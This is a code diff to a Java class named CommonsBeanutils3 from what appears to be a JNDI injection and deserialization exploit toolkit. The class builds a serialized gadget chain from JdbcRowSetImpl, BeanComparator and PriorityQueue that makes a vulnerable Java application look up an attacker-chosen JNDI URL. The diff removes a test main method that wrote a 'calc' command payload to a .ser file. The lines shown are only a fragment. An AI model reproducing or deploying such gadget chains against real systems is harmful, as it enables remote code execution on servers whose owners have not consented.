@@ -2,27 +2,18 @@ package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Reflections;
-import com.nu1r.jndi.utils.Config;
 import com.sun.rowset.JdbcRowSetImpl;
 import org.apache.commons.beanutils.BeanComparator;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.math.BigInteger;
 import java.util.PriorityQueue;
 
 public class CommonsBeanutils3 {
 
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("333.ser");
-        fous.write(bytes);
-        fous.close();
-    }
-
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
-        String jndiURL = null;
+    public static byte[] getBytes(PayloadType type) throws Exception {
+        String jndiURL;
         String command = String.valueOf(type);
         if (command.toLowerCase().startsWith("jndi:")) {
             jndiURL = command.substring(5);
